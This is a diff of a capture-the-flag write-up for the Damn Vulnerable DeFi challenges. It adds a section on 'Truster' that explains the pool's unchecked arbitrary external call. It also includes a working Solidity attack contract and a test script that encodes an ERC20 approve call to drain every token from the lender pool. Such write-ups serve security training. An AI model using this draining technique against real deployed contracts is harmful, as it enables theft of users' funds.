@@ -46,6 +46,8 @@ We can exploit this by transferring DVT tokens to contract with ERC20 `transfer`
 
 Solution code:
 
+**unstoppable.challenge.js**
+
 ```js
 // ...
 it('Exploit', async function () {
@@ -131,6 +133,104 @@ it('Exploit', async function () {
   );
   const attackContract = await AttackFactory.deploy(this.pool.address);
   await attackContract.attack(this.receiver.address);
+});
+// ...
+```
+
+## #3 - Truster
+
+Again, we have a flash loan lender contract. Goal is to drain all the funds from the pool. It offers flash loans for free, but has one big flaw.
+
+Here is the main function:
+
+```solidity
+function flashLoan(
+    uint256 borrowAmount,
+    address borrower,
+    address target,
+    bytes calldata data
+)
+    external
+    nonReentrant
+{
+    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+
+    damnValuableToken.transfer(borrower, borrowAmount);
+    target.functionCall(data);
+    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+}
+```
+
+As we can see logic seems fine, but `target` paramater and this line of code are critical to understand:
+
+```solidity
+target.functionCall(data);
+```
+
+It is very vulnerable external call. Essentially, pool is making call to `target` contract that **we** specify and it calls function that **we** specify with `data` paramater. Basically we can forward this call to any contract function with `msg.sender` being **pool** contract.
+
+More specifically we will call **ERC20** token `approve` function and approve ourselves as spender of all pool's tokens. In order to perform this hack in one transaction we will make new **TrusterAttack.sol** contract that will make a malicous loan (approve it's address as pool tokens spender) and transfer all tokens from pool in same function call.
+
+Solution code:
+
+**TrusterAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "../truster/TrusterLenderPool.sol";
+
+contract TrusterAttack {
+    TrusterLenderPool immutable pool;
+    IERC20 immutable token;
+
+    constructor(address _pool, address _token) {
+        pool = TrusterLenderPool(_pool);
+        token = IERC20(_token);
+    }
+
+    function attack(
+        uint256 borrowAmount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external {
+        pool.flashLoan(borrowAmount, borrower, target, data);
+        token.transferFrom(address(pool), msg.sender, 1000000 ether);
+    }
+}
+```
+
+**truster.challenge.js**
+
+```js
+// ...
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE  */
+  const AttackFactory = await ethers.getContractFactory(
+    'TrusterAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(
+    this.pool.address,
+    this.token.address
+  );
+
+  const amount = 0;
+  const borrower = attacker.address;
+  const target = this.token.address;
+  const abi = ['function approve(address spender, uint256 amount)'];
+  const iface = new ethers.utils.Interface(abi);
+  const data = iface.encodeFunctionData('approve', [
+    attackContract.address,
+    TOKENS_IN_POOL,
+  ]);
+
+  await attackContract.attack(amount, borrower, target, data);
 });
 // ...
 ```
